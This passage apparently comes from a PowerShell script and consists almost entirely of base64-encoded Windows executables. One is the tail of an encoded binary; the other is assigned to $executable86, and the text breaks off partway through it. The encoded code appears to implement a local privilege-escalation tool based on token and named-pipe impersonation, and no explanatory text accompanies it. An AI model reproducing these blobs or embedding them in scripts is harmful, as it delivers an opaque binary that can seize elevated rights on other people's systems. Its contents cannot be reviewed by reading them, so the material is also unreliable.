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+KMYpCCkKKTwpQCmEKYYpiCmKKYwpjimQKZIplimYKZopnCmeKaApoimkKaoprimyKbQptim4KbopmCoaKhwqHiogKiIqJComKigqKiosKi4qMCoyKjQqNio4KjoqPCo+KgwrjiuQK5IrlCuWK5grmiucK54roCuiK6QrpiuoK6orhCvGK8gryivMK84r0CvSK9Qr1ivYK9or3CveK+Ar4ivkK+Yr6CvqK+wr7ivwK/Ir9Cv2K/gr+iv8K/4rwCAAQDEAAAAAKAIoBCgGKAgoCigMKA4oECgSKBQoFigYKBwoHiggKCIoJCgmKCgoKigsKC4oMCgyKDQoNig4KDooPCg+KAAoQihEKEYoSChKKEwoTihQKFIoVChWKFgoWihcKF4oYChiKGQoZihoKGoobChuKHAocihkKWYpaClqKUIrhiuKK44rkiuWK5orniuiK6YrqiuuK7Irtiu6K74rgivGK8orzivSK9Yr2iveK+Ir5ivqK+4r8iv2K/or/ivAAAAkAEAkAEAAAigGKAooDigSKBYoGigeKCIoJigqKC4oMig2KDooPigCKEYoSihOKFIoVihaKF4oYihmKGoobihyKHYoeih+KEIohiiKKI4okiiWKJooniiiKKYoqiiuKLIotii6KL4ogijGKMoozijSKNYo2ijeKOIo5ijqKO4o8ij2KPoo/ijCKQYpCikOKRIpFikaKR4pIikmKSopLikyKTYpOik+KQIpRilKKU4pUilWKVopXiliKWYpailuKXIpdil6KX4pQimGKYopjimSKZYpmimeKaIppimqKa4psim2KbopvimCKcYpyinOKdIp1inaKd4p4inmKeop7inyKfYp+in+KcIqBioKKg4qEioWKhoqHioiKiYqKiouKjIqNio6Kj4qAipGKkoqTipSKlYqWipeKmIqZipqKm4qcip2KnoqfipCKoYqiiqOKpIqliqaKp4qoiqmKqoqriqyKrYquiq+KoIqxirKKs4q0irWKtoq3iriKuYq6iruKvIq9ir6Kv4qwisGKworDisAKABAPwAAABgqHCogKiQqKCosKjAqNCo4KjwqACpEKkgqTCpQKlQqWCpcKmAqZCpoKmwqcCp0KngqfCpAKoQqiCqMKpAqlCqYKpwqoCqkKqgqrCqwKrQquCq8KoAqxCrIKswq0CrUKtgq3CrgKuQq6CrsKvAq9Cr4KvwqwCsEKwgrDCsQKxQrGCscKyArJCsoKywrMCs0KzgrPCsAK0QrSCtMK1ArVCtYK1wrYCtkK2grbCtwK3QreCt8K0ArhCuIK4wrkCuUK5grnCugK6QrqCusK7ArtCu4K7wrgCvEK8grzCvQK9Qr2CvcK+Ar5CvoK+wr8Cv0K/gr/CvALABANwAAAAAoBCgIKAwoECgUKBgoHCggKCQoKCgsKDAoNCg4KDwoAChEKEgoTChQKFQoWChcKGAoZChoKGwocCh0KHgofChAKIQoiCiMKJAolCiYKJwooCikKKgorCiwKLQouCi8KIAoxCjIKMwo0CjUKNgo3CjgKOQo6CjsKPAo9Cj4KPwowCkEKQgpDCkQKRQpGCkcKSApJCkoKSwpMCk0KTgpPCkAKUQpSClMKVApVClYKVwpYClkKWgpbClwKXQpeCl8KUAphCmIKYwpkCmUKZgpnCmgKaQpgDgAQAYAAAAsKW4pciu4K7oroivkK+YrwAgAgBMAAAAsKH4oRiiOKJYoniiqKLAosii0KIIoxCjYKhwqHiogKiIqJComKigqKiosKi4qMio0KjYqOCo6KjwqPioAKlAqmiqkKoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="

$executable86 = "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